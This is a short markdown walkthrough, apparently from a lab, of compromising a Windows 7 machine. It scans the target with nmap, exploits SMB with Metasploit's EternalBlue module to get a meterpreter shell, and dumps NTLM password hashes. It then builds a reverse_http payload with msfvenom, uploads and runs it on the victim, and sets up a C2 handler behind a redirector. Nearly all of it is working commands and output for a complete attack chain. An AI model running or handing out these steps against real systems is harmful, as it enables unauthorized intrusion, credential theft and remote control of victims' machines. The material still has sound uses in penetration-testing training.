# Exploitation & C2 Communication
A demonstration of a basic attack on a windows 7 machine using a C2 server.

## 1. Scan for target
My target is a windows 7 host. The following fast scan will avoid resolving DNS and identify the windos machine I'm looking for.

```
nmap -T4 -F -n -sV 10.10.10.10

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
```

## 2. Choose Exploit
Choose the exploit you wish to use. In this case I will exploit SMB running on port 445 using `ms17_010_eternalblue`. 

```
msfconsole -q
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
```

Use `ifconfig` to determine your local host adapter and set it

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST eth0
LHOST => eth0
```

The Remote host is your victim ip

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.10.10.10
RHOST => 10.10.10.10
```

Run the exploit to get a meterpreter prompt

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

meterpreter >
```

## 3. Explore the Victim Device
Once you have a shell you can explore the device

Get the NT/LM Hashes for the users on the system.

```
meterpreter> hashdump

[Username, :, 502, :, aad3c435b514a4eeaad3b935b51304fe, :, c46b9e588fa0d112de6f59fd6d58eae3, :, :, :]
```
| Part | Description |
| ---- | ----------- | 
| `Username` | The user name |
| `500` | relative identifier (500 is administrator) |
| `aad3c435b514a4eeaad3b935b51304fe` |  LM Hash |
| `c46b9e588fa0d112de6f59fd6d58eae3` |  NT Hash |

## 4. Generate a Payload
On your machine generate a payload using `msfvenom`

```
msfvenom -p windows/meterpreter/reverse_http LHOST=eth0 LPORT=80 HttpUserAgent=TEST -f exe -o shell.exe

Saved as: shell.exe
```

## 5. Transfer shell to victim
Upload the shell to your victim and execute it. You can use wireshark to verify communication works.

```
meterpreter > upload shell.exe
meterpreter > execute -f shell.exe

Process 1012 created.
```

## 6. Setting up Exploit / Multi / Handler
We will need to modify meterpreter to use these new interfaces

`LHOST` - Public interface expecting redirector connections
`LPORT` - Chosen port
`OverrideLHOST` - Redirector IP / Domain
`OverrideLPORT` - Port HTTP/HTTPS is runnin on redirector
`OverrideRequestHost` - Forces Meterpreter to respond with overridehost info instead of c2 info

```
msfconsole
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_http
msf6 > set LHOST 12.12.12.12
msf6 > set LPORT 8080
msf6 > set ReverseListenerBindAddress 12.12.12.12
msf6 > set ReverseListenerBindPort 8080
msf6 > set OverrideLHOST 11.11.11.11
msf6 > set OverrideLPORT 80
msf6 > set HttpUserAgent TEST
msf6 > set OverrideRequestHost true
```
